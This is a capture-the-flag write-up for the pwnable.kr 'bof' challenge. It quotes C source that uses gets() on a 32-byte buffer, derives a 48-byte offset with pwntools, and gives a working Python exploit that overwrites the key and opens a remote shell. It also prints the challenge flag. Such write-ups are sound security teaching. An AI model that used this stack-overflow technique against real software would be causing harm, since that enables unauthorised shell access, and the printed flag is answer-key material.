
# PWNABLE.KR - bof



### Description:
>Nana told me that buffer overflow is one of the most common software vulnerability. 
>Is that true?

>Download : http://pwnable.kr/bin/bof
>Download : http://pwnable.kr/bin/bof.c

>Running at : nc pwnable.kr 9000


### Reconnaissance / Code Analysis:

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

#### The `main` function does not do much except calling the `func` function, so we will move on to the `func` function:

```C
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
```

We have a 32 bytes buffer named `overflowme` and a `gets` function to read in our input. `Gets` is particularly dangerous as it can not detect the end of available memory and can be vulnerable to `buffer overflow` attack .

#### Therefore, our main objective is to overflow the buffer to replace `key` with `0xcafebabe` so that we can use the shell.



### Solution
#### In order to perform a buffer overflow attack, we need to know the offset from which our target (`key` variable) will be overflowed.

When disassembling the `func` function, we can notice a `cmp` function:

![func disassemble](https://github.com/Catcurity123/CTF/blob/main/picture/1.png)

#### Therefore, we just need to place a break point at this function to examine the location and value of `ebp + 8` to find the offset to overflow.
To make our work even easier, `pwntools` offers cyclic to find offset way faster:

```
cyclic 64
>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
```
We can then examine our stack to find the location of `key`:

![offset](https://github.com/Catcurity123/CTF/blob/main/picture/2.png)

We can see that `ebp + 8` is at `oxffffcff0`, that is the location we want to overflow. In order to find the exact number, `pwntools` also support `unhex` and `cyclic -l`:

![exact number](https://github.com/Catcurity123/CTF/blob/main/picture/3.png)

#### Therefore, our offset is 48 and the value we want to insert is `\xbe\xba\xfe\xca`:

To enter the bash on the server, we can use `pwntools` once again:

```python
from pwn import *

padding = "A" * 48
key = "\xbe\xba\xfe\xca"
payload = padding + key

shell = remote('pwnable.kr',9000)
shell.send(payload)
shell.interactive()

```

#### Finally, we have our output as follows:

![result](https://github.com/Catcurity123/CTF/blob/main/picture/4.png)
## Flag

```
daddy, I just pwned a buFFer :)

```
